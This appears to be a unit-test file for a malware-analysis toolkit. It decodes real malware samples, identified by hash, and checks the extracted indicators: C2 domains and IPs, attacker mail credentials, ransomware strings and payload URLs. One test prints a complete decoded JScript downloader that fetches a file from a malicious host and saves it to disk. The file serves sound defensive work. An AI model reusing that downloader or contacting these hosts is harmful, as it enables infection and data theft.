#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import json

from .. import TestBase
from io import BytesIO
from hashlib import sha256

from refinery.lib.loader import load_pipeline, load_detached as L


class TestGrabBagExamples(TestBase):

    def test_example_01_maldoc(self):
        data = self.download_sample('81a1fca7a1fb97fe021a1f2cf0bf9011dd2e72a5864aad674f8fea4ef009417b')

        # flake8: noqa
        pipeline = L('xlxtr 9.5:11.5 15.15 12.5:14.5') [
            L('scope -n 3') | L('chop -t 5') [
                L('sorted -a') | L('snip 2:') | L('sep')
            ]| L('pack 10') | L('alu --dec -sN B-S')
        ]| L('carve -sd b64') | L('zl') | L('deob-ps1') \
         | L('carve -sd b64') | L('zl') | L('deob-ps1') \
         | L('xtp -f domain')

        with BytesIO(data) as sample:
            c2servers = set(sample | pipeline)

        self.assertSetEqual(
            {bytes(c2) for c2 in c2servers},
            {c2 % 0x2E for c2 in {
                b'udatapost%cred',
                b'marvellstudio%conline',
                b'sdkscontrol%cpw',
                b'abrakam%csite',
                b'hiteronak%cicu',
                b'ublaznze%conline',
                b'sutsyiekha%ccasa',
                b'makretplaise%cxyz',
            }}
        )

    def test_example_02_hawkeye_config(self):
        data = self.download_sample('ee790d6f09c2292d457cbe92729937e06b3e21eb6b212bf2e32386ba7c2ff22c')
        rsrc = L('perc RCDATA')(data)

        pipeline = L('xtp guid') [
            L('pbkdf2 48 rep[8]:H:00') | self.ldu('cca', rsrc) | L('aes x::32 --iv=x::16 -Q')
        ] | L('dnds')

        result = json.loads(pipeline(data))
        config = result[2]['Data']['Members']

        self.assertEqual(config['_EmailServer'], F'mail{"."}bandaichemical{"."}com')
        self.assertEqual(config['_EmailUsername'], F'cv{"@"}bandaichemical{"."}com')
        self.assertEqual(config['_EmailPassword'], F'kingqqqqqq1164')
        self.assertEqual(config['_EmailPort'], 587)

    def test_warzone_sample(self):
        data = self.download_sample('4537fab9de768a668ab4e72ae2cce3169b7af2dd36a1723ddab09c04d31d61a5')
        pipeline = L('vsect .bss') | L('struct I{key:{}}{}') [
            L('rc4 eat:key') | L('struct I{host:{}}{port:H} {host:u16}:{port}') ]
        self.assertEqual(str(data | pipeline), '165.22.5''.''66:1111')

    def test_blackmatter_sample(self):
        data = self.download_sample('c6e2ef30a86baa670590bd21acf5b91822117e0cbe6060060bc5fe0182dace99')
        pipeline = load_pipeline('push [| vsect .rsrc | struct {KS:L}{} | pop | vsect .data | struct -m L{:{0}}'
            '| xor -B4 "accu[KS,1,32]:(A*0x8088405+1)#((KS*A)>>32)" | repl h:00 | carve -n8 printable ]]')
        strings = str(data | pipeline).splitlines(False)
        self.assertIn('Safari/537.36', strings)
        self.assertIn('bcdedit /set {current} safeboot network', strings)
        self.assertTrue(any('"bot_company":"%.8x%.8x%.8x%.8x%"' in x for x in strings))
        self.assertTrue(any('BlackMatter Ransomware encrypted all your files!' in x for x in strings))

    def test_agent_tesla_sample(self):
        data = self.download_sample('fb47a566911905d37bdb464a08ca66b9078f18f10411ce019e9d5ab747571b40')
        pipeline = load_pipeline(R'dnfields [| aes x::32 --iv x::16 -Q | sep ]| rex -M "((??email))\n(.*)\n(.*)\n:Zone" addr={1} pass={2} host={3}')
        result = str(data | pipeline)
        self.assertListEqual(result.splitlines(False), [
            'addr=ioanna@pgm''-gruop''.eu',
            'pass=Password2019',
            'host=smtp.pgm''-gruop''.eu',
        ])

    def test_remcos_sample(self):
        data = self.download_sample('c0019718c4d4538452affb97c70d16b7af3e4816d059010c277c4e579075c944')
        pipeline = load_pipeline('perc SETTINGS [| put keylen cut::1 | rc4 cut::keylen | xtp socket ]')
        self.assertEqual('remm.duckdns''.''org:7007', str(data | pipeline))

    def test_shellcode_loader(self):
        data = self.download_sample('58ba30052d249805caae0107a0e2a5a3cb85f3000ba5479fafb7767e2a5a78f3')
        pipeline = load_pipeline('rex yara:50607080.* [| struct LL{s:L}{} | xor -B2 accu[s]:@msvc | xtp url ]')
        self.assertEqual(str(data | pipeline), 'http://64.235.39''.82')

    def test_example_02_maldoc(self):
        data = self.download_sample('ee103f8d64cd8fa884ff6a041db2f7aa403c502f54e26337c606044c2f205394')
        pipeline = load_pipeline('doctxt | repl drp:c: | carve -s b64 | rev | b64 | rev | ppjscript')
        self.assertEqual(str(data | pipeline), '\n'.join((
            r'var girlLikeDoor = new ActiveXObject("msxml2.xmlhttp");',
            r'girlLikeDoor.open("GET", "http://shoulderelliottd'
                r'.com/boolk/QlaJk8C6vYqIyEwbdypBHv3yJR/wrWWNCD/77427/bebys8'
                r'?cid=Bm9cAP&wP8zhkK=aNLC3bJChZM5GauIB&=S0MRS72jqtkORxKA3iUkjdS", false);',
            r'girlLikeDoor.send();',
            r'if (girlLikeDoor.status == 200) {',
            r'    try {',
            r'        var karolYouGirl = new ActiveXObject("adodb.stream");',
            r'        karolYouGirl.open;',
            r'        karolYouGirl.type = 1;',
            r'        karolYouGirl.write(girlLikeDoor.responsebody);',
            r'        karolYouGirl.savetofile("c:\\users\\public\\tubeGirlLoad.jpg", 2);',
            r'        karolYouGirl.close;',
            r'    } catch (e) {}',
            r'}',
        )))

    def test_sockaddr_decoding(self):
        pipeline = load_pipeline(
            'emit "0x51110002 0xAFBAFA12" | pack -B4 | struct 2x{port:!H}{addr:4}{} ['
            ' | push var:addr | pack -R [| sep . ]| pop addr | cfmt {addr}:{port} ]')
        result = pipeline()
        self.assertEqual(result, B'18.250.186.175:4433')

    def test_email_sample_from_meta_docstring(self):
        data = self.download_sample('307b76e0b88904a5da7539a2e2c437b65d8e9d66574e992ea9f2abae1c699b6f')
        pipeline = load_pipeline(
            R'push [[| xt body.txt | rex -I password:\\s*(\\w+) {1} | pop p ]| xt *.zip | xt *.exe -p var:p ]')
        exe = data | pipeline | bytearray
        self.assertTrue(exe.startswith(b'MZ'))
        self.assertEqual(sha256(exe).hexdigest().lower(),
            '7c318ed4278ec449deebb5897daf2e547f7e1ab10e19be3fe5ec9ac5f061cb26')

    def test_malicious_pdf_with_javascript(self):
        data = self.download_sample('066aec7b106f669e587b10b3e3c6745f11f1c116f7728002f30c072bd42d6253')
        pipeline = load_pipeline(
            R'xt JS | carve -sd string | carve -sd string | url | xtp url [| urlfix ]]')
        urls = data | pipeline | {str}
        self.assertSetEqual(urls, {
            'http'U':/'R'/addvertseense'U'.co'R'.uk/bfgnqs2.exe',
            'http'U':/'R'/addvertseense'U'.co'R'.uk/click.php',
        })
